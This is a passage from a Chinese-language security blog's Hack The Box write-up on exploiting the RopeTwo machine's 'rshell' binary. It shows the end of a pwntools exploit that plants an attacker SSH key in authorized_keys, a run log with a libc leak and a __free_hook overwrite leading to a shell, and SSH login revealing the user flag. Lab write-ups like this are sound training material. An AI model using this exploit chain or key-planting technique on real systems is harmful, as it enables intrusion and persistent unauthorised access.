AAAAB3NzaC1yc2EAAAADAQABAAABgQC+Tuty8485wlno7YD87opBzB3ehsFJN475yHgPuJV+t1oAk7UwtpLQLWbqa5SCpNbJtCeOK5L/He/F0Oe2D0UOZ5klMrcQGWqml1SpQTPHlpRQbTLdi6mMcsKhyHdJV5RqtqfFnPNdS4qF7k6COpOr/9S/UOr1V/zy/0vd2Bqqf9+K5s8xc+kNnfhfnYjWdlXP/avMFg7kRm4bTxJXlI2gGKF3LTw/iIbZ+5o/jY68UFq1NXk3Gtuv0ObVaRDU5f/7SlfqHKJUjQKkaqUdpAYOyGUY9uorYJe9GGor5+YyYysKCXkbhFvr28KqK/FsSBKCdEQM+z1nwyLXA2EArcqbgM6GQrfRcdHTmaMwP+Ti4F9iFD6r1DVrJpKZ4HinpDRtvQQncmtaUew5t78Z8a55zMWqV90A447y0Qg0nRxEa8gDr/PHOvcUmpKy3ocmwKD7x8ZEgNRvpm0INCOOcnjasddE/zrukoo1+fwzNB3R2lnghsNa8ShoctkAbgZmrSU= root@kali&quot; &gt; /home/r4j/.ssh/authorized_keys&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;chmod 600 /home/r4j/.ssh/authorized_keys&quot;</span>)</span><br><span class="line">    log.success(<span class="string">&quot;Wrote SSH key to /home/r4j/.ssh/authorized_keys&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå®ƒä¼šè¿”å›ä¸€ä¸ªshell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># python3 pwn_rshell.py REMOTE</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Connecting to 10.10.10.196 on port 22: Done</span><br><span class="line">[ERROR] python is not installed on the remote system <span class="string">&#x27;10.10.10.196&#x27;</span></span><br><span class="line">[*] chromeuser@10.10.10.196:</span><br><span class="line">    Distro    Unknown Unknown</span><br><span class="line">    OS:       Unknown</span><br><span class="line">    Arch:     Unknown</span><br><span class="line">    Version:  0.0.0</span><br><span class="line">    ASLR:     Disabled</span><br><span class="line">    Note:     Susceptible to ASLR <span class="built_in">ulimit</span> trick (CVE-2016-3672)</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[-] Failed</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[-] Failed</span><br><span class="line">[+] Opening new channel: <span class="string">&#x27;rshell&#x27;</span>: Done</span><br><span class="line">[+] Leaked address: 0x7f96ffdd6570</span><br><span class="line">[+] Libc base: 0x7f96ffbef000</span><br><span class="line">[*] Overwriting __free_hook</span><br><span class="line">[*] Triggering shell</span><br><span class="line">[+] Wrote SSH key to /home/r4j/.ssh/authorized_keys</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ $ $ $ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1001(chromeuser) <span class="built_in">groups</span>=1001(chromeuser)</span><br><span class="line">$ $ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">$ $ <span class="built_in">ls</span></span><br><span class="line">chrome    web</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell.jpg"></li>
</ul>
<p>SSHä¹Ÿå¯ä»¥æ­£å¸¸è¿æ¥:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">â””â”€<span class="comment"># ssh -i id_rsa r4j@10.10.10.196</span></span><br><span class="line">Welcome to Ubuntu 19.04 (GNU/Linux 5.0.0-38-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sun Feb 21 14:56:24 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:  0.04               Processes:             302</span><br><span class="line">  Usage of /:   42.8% of 19.56GB   Users logged <span class="keyword">in</span>:       0</span><br><span class="line">  Memory usage: 39%                IP address <span class="keyword">for</span> ens160: 10.10.10.196</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">454 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Feb 21 14:53:20 2021 from 10.10.14.6</span><br><span class="line">r4j@rope2:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(r4j) gid=1000(r4j) <span class="built_in">groups</span>=1000(r4j)</span><br><span class="line">r4j@rope2:~$ <span class="built_in">whoami</span></span><br><span class="line">r4j</span><br><span class="line">r4j@rope2:~$ <span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">r4j@rope2:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">77fad0ddf2c6c7736a86ce77a44c204f</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rope2-rshell1.jpg"></li>
</ul>
<p><font color="red"><em><strong>Damn! Really Crazy! Ha?</strong></em></font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="fdvoid0 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="fdvoid0 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>fdvoid0
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/" title="HackTheBox-RopeTwo-[pwn-rshell]">https://fdlucifer.github.io/2021/02/18/hackthebox-rope2-rshell-exploit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="fa fa-stack-exchange"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/02/15/Exploiting-the-Math-expm1-typing-bug-in-V8/" rel="prev" title="åˆ©ç”¨V8ä¸­çš„Math-expm1-typingæ¼æ´">
                  <i class="fa fa-chevron-left"></i> åˆ©ç”¨V8ä¸­çš„Math-expm1-typingæ¼æ´
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/02/22/toxin/" rel="next" title="Hack-The-Box-pwn-challenge[Toxin]">
                  Hack-The-Box-pwn-challenge[Toxin] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 â€“ 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fdvoid0</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">631k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">38:14</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
